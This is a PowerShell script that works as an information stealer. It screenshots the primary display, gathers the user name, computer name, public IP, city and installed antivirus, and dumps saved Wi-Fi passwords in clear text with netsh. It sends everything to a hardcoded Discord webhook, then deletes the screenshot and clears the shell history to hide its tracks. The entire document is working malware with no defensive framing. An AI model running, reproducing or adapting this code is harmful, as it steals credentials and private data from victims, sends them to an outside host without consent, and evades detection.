# --- CONFIGURATION ---
$WEBHOOK = "https://discord.com/api/webhooks/1481790664013512774/aFcyihxEknHXmDUtZIOH36pmZQrcBhAbYbH3d8uAHuwpDKOjD7NEtKiS_Wy6FuUTK0dY"
$SCREENSHOT_PATH = "$env:TEMP\sys_log.png"

# --- SCREENSHOT LOGIC ---
try {
    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
    $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $Bitmap = New-Object System.Drawing.Bitmap($Screen.Width, $Screen.Height)
    $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
    $Graphics.CopyFromScreen(0, 0, 0, 0, $Bitmap.Size)
    $Bitmap.Save($SCREENSHOT_PATH, [System.Drawing.Imaging.ImageFormat]::Png)
    $Graphics.Dispose(); $Bitmap.Dispose()
} catch {
    Write-Host "Screenshot failed"
}

# --- DATA GATHERING ---
$User = $env:USERNAME
$PC = $env:COMPUTERNAME
$IPInfo = Invoke-RestMethod ipinfo.io/json
$PublicIP = $IPInfo.ip
$City = $IPInfo.city
$AV = (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct).displayName

# --- WIFI EXTRACTION ---
$WiFi = netsh wlan show prof | Select-String ':\s+(.+)$' | ForEach-Object {
    $name = $_.Matches.Groups[1].Value.Trim()
    $pass = netsh wlan show prof name=$name key=clear | Select-String 'Key Content\s+:\s+(.+)$' | ForEach-Object { $_.Matches.Groups[1].Value }
    "SSID: $name | Key: $pass"
} | Out-String

# --- DISCORD DELIVERY ---
$Payload = @{
    embeds = @(@{
        title = "Nexus Extraction - Admin Level"
        color = 16711680 # Red
        fields = @(
            @{ name = "Target User"; value = "$User @ $PC"; inline = $True }
            @{ name = "Location"; value = "$PublicIP ($City)"; inline = $True }
            @{ name = "Security Soft"; value = if($AV){$AV}else{"None Detected"}; inline = $False }
            @{ name = "WiFi Keys"; value = if($WiFi){$WiFi.Substring(0,[Math]::Min($WiFi.Length, 1000))}else{"None"}; inline = $False }
        )
    })
}

$Json = $Payload | ConvertTo-Json -Depth 4
Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $Json -ContentType 'application/json'

# Upload the screenshot via curl (built-in to Win10/11)
if (Test-Path $SCREENSHOT_PATH) {
    curl.exe -F "file=@$SCREENSHOT_PATH" $WEBHOOK
    Remove-Item $SCREENSHOT_PATH
}

# --- CLEANUP ---
Clear-History
exit
